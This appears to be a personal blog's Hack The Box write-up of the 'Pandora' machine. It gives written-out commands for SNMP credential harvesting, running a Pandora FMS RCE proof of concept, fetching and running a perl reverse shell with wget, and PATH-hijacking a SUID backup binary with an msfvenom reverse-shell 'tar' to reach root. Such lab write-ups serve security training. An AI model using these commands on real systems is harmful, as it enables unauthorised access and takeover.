<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <title>Matthew Castro - Blog</title>
    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
    <!-- Font Awesome icons (free version)-->
    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
    <!-- Google fonts-->
    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
        type="text/css" />
    <link
        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
        rel="stylesheet" type="text/css" />
    <!-- Core theme CSS (includes Bootstrap)-->
    <link href="../../css/styles.css" rel="stylesheet" />
    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
    <link rel="preload" as="image" href="/assets/img/posts.jpg">
</head>

<body>
    <!-- Navigation-->
    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
        <div class="container px-4 px-lg-5">
            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                Menu
                <i class="fas fa-bars"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
                <ul class="navbar-nav ms-auto py-4 py-lg-0">
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- Page Header-->
    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
        <div class="container position-relative px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <div class="post-heading">
                        <h2>Pandora - Hack The Box Write-up</h2>
                        <span class="meta">
                            Posted on February 5th, 2026
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Post Content-->
    <article class="mb-4">
        <div class="container px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <p>We start by enumerating the machine with Nmap and Feroxbuster. We find 2 open TCP ports (22 and 80) and 1 open UDP port (161).
                        We don't find much after enumerating the web server on port 80, but we find credentials after enumerating the SNMP service and use them to
                        obtain a low privilege SSH session on the machine.
                    </p>
                        <span class="grey-line">sudo nmap -sV -T5 -p- 10.10.11.136 -v</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/1.png" alt="..." />                   
                        <p></p>
                        <span class="grey-line">sudo nmap -sU -f -T 5 panda.htb -v</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/2.png" alt="..." />                   
                        <p></p>
                        <span class="grey-line">sudo nmap -sU -p 161 --script "snmp*" panda.htb</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/3.png" alt="..." />                   
                        <p></p>
                        We find credentials passed in cleartext to a process in the script results:
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/4.png" alt="..." />                   
                        <p></p>
                        <span class="grey-line">ssh daniel@panda.htb</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/5.png" alt="..." />                   
                        <p></p>
                        Using our SSH session we find 2 directories within /var/www, “html” and “pandora”. 
                        In the "pandora" directory, there is a folder called pandora_console. If we visit the
                         localhost web address with curl while including this directory, we get a 200 response.
                          We decide to port-forward the web server with SSH to enumerate the directory further.
                        <p></p>
                        <span class="grey-line">cd /var/www</span>
                        <p></p> 
                        <span class="grey-line">ls</span>
                        <p></p> 
                        <span class="grey-line">ls pandora/</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/6.png" alt="..." />                   
                        <p></p>
                        <span class="grey-line">curl localhost/pandora_console/</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/7.png" alt="..." />                   
                        <p></p>
                        <span class="grey-line">ssh -L localhost:8000:localhost:80 daniel@panda.htb</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/8.png" alt="..." />                   
                        <p></p>
                        We can now access the web page from our attack machine. We instantly identified the application as Pandora FMS
                         and found its version number. We then exploited an unauthenticated RCE vulnerability present in this version to obtain a web shell as user Matt.
                        <p></p>
                        The version number found at the bottom of the web page:
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/9.png" alt="..." />                   
                        <p></p>
                        We find the POC for the vulnerability (third result): 
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/10.png" alt="..." />                   
                        <p></p>
                        <span class="grey-line">python3 sqlpwn.py -t localhost:8000 -f rev.php</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/11.png" alt="..." />                   
                        <p></p>
                        We transfer and execute a perl reverse shell.
                        <p></p>
                        <span class="grey-line">python3 -m http.server 80</span>
                        <p></p>
                        <span class="grey-line">wget http://10.10.14.40:80/rev.pl</span>
                        <p></p>
                        <span class="grey-line">perl rev.pl</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/12.png" alt="..." />                   
                        <p></p>
                        We upgraded our shell using Python.
                        <p></p>
                        <span class="grey-line">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/13.png" alt="..." />       
                        <p></p>            
                        We then enumerate all SUID binaries to find the custom binary /usr/bin/pandora_backup. 
                        We can reverse engineer it to find that it calls the tar binary with a relative path. 
                        We load our custom malicious tar binary into the current folder, export our current 
                        folder into the PATH variable and run “pandora_backup” to get a reverse shell as root.
                        <p></p>
                        We find the custom SUID script:
                        <p></p>
                        <span class="grey-line">find / -type f -perm -4000 2>/dev/null</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/14.png" alt="..." />       
                        <p></p>
                        We transfer the binary locally:
                        <p></p>
                        <span class="grey-line">cd /usr/bin/</span>
                        <p></p>
                        <span class="grey-line">python3 -m http.server 8000</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/15.png" alt="..." />       
                        <p></p>
                        <span class="grey-line">wget http://panda.htb:8000/pandora_backup</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/16.png" alt="..." />       
                        <p></p>
                        Here we notice that tar is being called without its absolute path:
                        <p></p>
                        <span class="grey-line">strings pandora_backup</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/17.png" alt="..." />       
                        <p></p>
                        This relative call of the tar binary will allow us to perform binary hijacking and obtain a root shell.
                        <p></p>
                        We generate our malicious tar binary:
                        <p></p>
                        <span class="grey-line">msfvenom  -p linux/x64/shell_reverse_tcp LHOST=10.10.14.46 LPORT=1234  -f elf -o tar </span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/18.png" alt="..." />       
                        <p></p>
                        We transfer it to the victim machine:
                        <p></p>
                        <span class="grey-line">python3 -m http.server 80</span>
                        <p></p>
                        <span class="grey-line">wget http://10.10.14.40:80/tar</span>
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/19.png" alt="..." />       
                        <p></p>
                        We set its permissions, export the current path and run the SUID binary.
                         It is important to break out of the restricted shell or else it won't run as root even though it is SUID.
                        <p></p>
                        <span class="grey-line">echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null</span>
                        <p></p>
                        <span class="grey-line">chmod +x tar</span>
                        <p></p>                     
                        <span class="grey-line">export PATH=$(pwd):$PATH</span>
                        <p></p>
                        <span class="grey-line">nc -lvnp 1234</span> 
                        <p></p>
                        <span class="grey-line">/usr/bin/pandora_backup</span> 
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/20.png" alt="..." />       
                        <p></p>
                        Root shell:
                        <p></p>
                        <img class="img-fluid" src="../../assets/img/writeups/pandora/21.png" alt="..." />       

                </div>
            </div>
        </div>
    </article>
    <!-- Bootstrap core JS-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Core theme JS-->
    <script src="js/scripts.js"></script>
</body>

</html>